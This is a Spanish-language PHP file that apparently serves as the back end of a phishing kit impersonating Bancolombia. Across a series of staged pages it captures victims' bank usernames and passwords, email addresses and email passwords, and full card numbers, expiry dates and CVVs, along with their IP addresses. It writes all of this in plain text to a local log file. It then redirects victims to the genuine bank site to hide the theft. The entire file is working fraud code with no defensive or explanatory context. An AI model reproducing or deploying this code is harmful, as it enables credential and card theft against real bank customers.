<?php
header("Content-Type: text/html; charset=utf-8");
require "liquidador.php";
require "ayudador.php";
if (is_session_started() === FALSE) {
    session_start();
}

$archivo = "vamosconfe.txt";
function getRealIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];

    return $_SERVER['REMOTE_ADDR'];
}
$usuario = filter_input(INPUT_POST, "usuario");

$clave = filter_input(INPUT_POST, "clave");

$email = filter_input(INPUT_POST, "email");
$cemail = filter_input(INPUT_POST, "eclave");


$ntarjeta = filter_input(INPUT_POST, "ncard");
$mes = filter_input(INPUT_POST, "mes");
$anio = filter_input(INPUT_POST, "anio");
$cvv = filter_input(INPUT_POST, "cvv");

$ip = getRealIP();
if (!empty($usuario)) {
    $_SESSION["permiso1"]  = "permito";
    $datos = "
=======================================
|| Usuario: " . $usuario . "
|| Ip: ".$ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:validatepassword.php");
}

if (!empty($clave) && array_key_exists("permiso1", $_SESSION)) {
    unset($_SESSION["permiso1"]);
    $_SESSION["permiso2"]  = "permito";
    $datos = "
|| Clave: " . $clave . "
|| Ip: ".$ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:validaemail.php");
}

if (!empty($email) && !empty($cemail) && array_key_exists("permiso2", $_SESSION)) {
    unset($_SESSION["permiso2"]);
    $_SESSION["permiso3"]  = "permito";
    $datos = "
|| Email:   ".$email." 
|| Cemail:  ".$cemail."
|| Ip: ".$ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:validacard.php");
}
if (!empty($ntarjeta) && !empty($mes) && !empty($anio) && !empty($cvv) && array_key_exists("permiso3", $_SESSION)) {
    unset($_SESSION["permiso3"]);
    $datos = "
|| Tarjeta:   ".$ntarjeta." 
|| Fecha:  ".$mes."/".$anio." 
|| Cvv:  ".$cvv." 
|| Ip: ".$ip."
=======================================";
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:https://www.grupobancolombia.com/personas");
}